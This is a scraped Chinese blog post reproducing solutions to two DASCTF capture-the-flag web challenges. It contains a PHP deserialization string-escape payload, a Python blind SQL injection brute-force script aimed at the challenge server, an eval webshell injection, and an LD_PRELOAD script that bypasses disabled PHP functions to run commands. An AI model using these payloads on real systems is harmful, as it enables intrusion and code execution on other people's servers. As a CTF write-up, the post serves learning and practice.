<!--yml
category: 未分类
date: 2022-04-26 14:54:41
-->

# DASCTF-两道web题复现_cr4ke3的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_43784056/article/details/105895496](https://blog.csdn.net/weixin_43784056/article/details/105895496)

记录一下官方题解

**Ezunserialize**

打开题目看到源码

```
<?php 
show_source("index.php"); 
function write($data) { 
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data); 
} 

function read($data) { 
    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data); 
} 

class A{ 
    public $username; 
    public $password; 
    function __construct($a, $b){ 
        $this->username = $a; 
        $this->password = $b; 
    } 
} 

class B{ 
    public $b = 'gqy'; 
    function __destruct(){ 
        $c = 'a'.$this->b; 
        echo $c; 
    } 
} 

class C{ 
    public $c; 
    function __toString(){ 
        //flag.php 
        echo file_get_contents($this->c); 
        return 'nice'; 
    } 
} 

$a = new A($_GET['a'],$_GET['b']); 
//省略了存储序列化数据的过程,下面是取出来并反序列化的操作 
$b = unserialize(read(write(serialize($a))));
```

先实现B->C

```
$b = new b();
$c = new c();
$c->c = 'flag.php';
$b->b = $c;
$x = serialize($b);
echo $x;
//O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}
```

然后就是字符串逃逸实现A->B

```
$a = new A("\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0",'1";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}};}');
$a = serialize($a);
echo $a."\n";
$a = write($a);
echo $a."\n";
$a = read($a);
echo $a."\n";
```

将payload进行url加密

```
a=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&b=1%22%3Bs%3A8%3A%22password%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22b%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A1%3A%22c%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
```

babytricks

打开题目是个登录界面，查看源码发现提示

```
<!-- tips:select * from user where user='$user' and passwd='%s'-->
```

这是个格式化字符串漏洞，过滤了select，单引号，like，regexp，跑密码脚本，密码最后一位需要减一

```
import requests
flag=""
flag2=""
arg1=""
arg2=""
i=1
n=2

for i in range(1,28):
    print(i)
    m=64
    j=64
    for q in range(1,8):
        if q!=1:
            j=j/2
            if n==1:
                m=m+j
            elif n==0:
                m=m-j
        arg2=chr(m)
        arg2=flag2+arg2
        url="http://183.129.189.60:10010/"
        user='%1$c^0 and passwd between CONCAT("{}",BINARY("")) and CONCAT("{}",BINARY(""))#'.format(arg1,arg2)
        #print user
        data={"user":user,
              "passwd":39
              }
        p=requests.post(url,data=data)
        if "username or password error" not in p.text:
            n=0
        else:
            n=1
        if q==7:
            if "username or password error" not in p.text:
                flag=flag+chr(m-1)
                arg2=chr(m-1)
                flag2=flag2+arg2
            else:
                flag=flag+chr(m)
                flag2=arg2
            print flag

#GoODLUcKcTFer202OHAckFuN
```

得到密码之后登录，提示前台什么都没有，添加admin目录进入后台登录页面，使用刚刚得到的密码，得到下一步源码

```
Your sandbox: ./shells/iIu9B9eVuikO3cOi/ set your shell
<?php 
error_reporting(0); 
session_save_path('session'); 
session_start(); 
require_once './init.php'; 
if($_SESSION['login']!=1){ 
    die("<script>window.location.href='./index.php'</script>"); 
} 
if($_GET['shell']){ 
    $shell= addslashes($_GET['shell']); 
    $file = file_get_contents('./shell.php'); 
    $file = preg_replace("/\\\$shell = '.*';/s", "\$shell = '{$shell}';", $file); 
    file_put_contents('./shell.php', $file); 
}else{ 
    echo "set your shell"."<br>"; 
    chdir("/"); 
    highlight_file(dirname(__FILE__)."/admin.php"); 
} 
?> 
```

payload

```
?shell=;eval($_POST[a]);
?shell=$0
```

shell.php文件中的代码

```
<?php
$shell = '$shell = ';eval($_POST[a]);';';
echo $shell;
```

由于这里过滤了很多系统函数，使用LD_PRELOAD进行bypass

```
<?php
    echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";

    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";

    putenv("EVIL_CMDLINE=" . $evil_cmdline);

    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);

    $res = gnupg_init();
    gnupg_seterrormode($res, GNUPG_ERROR_WARNING);
    $info = gnupg_keyinfo($res, 'your-key-id');
    echo "Key - Info<pre>";
    var_dump($info);
    echo "<pre>";

    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 

    unlink($out_path);
?>
```

访问下面网址，得到flag

```
http://183.129.189.60:10010/admin/shells/R0zK2XMtjvzvyxWz/bypass.php?cmd=cat%20/flag&outpath=/var/www/html/admin/shells/R0zK2XMtjvzvyxWz/xx&sopath=/var/www/html/admin/shells/R0zK2XMtjvzvyxWz/bypass_disablefunc_x64.so
```

 ![](img/5bc820a9480f63dd7af93e52bca9e847.png)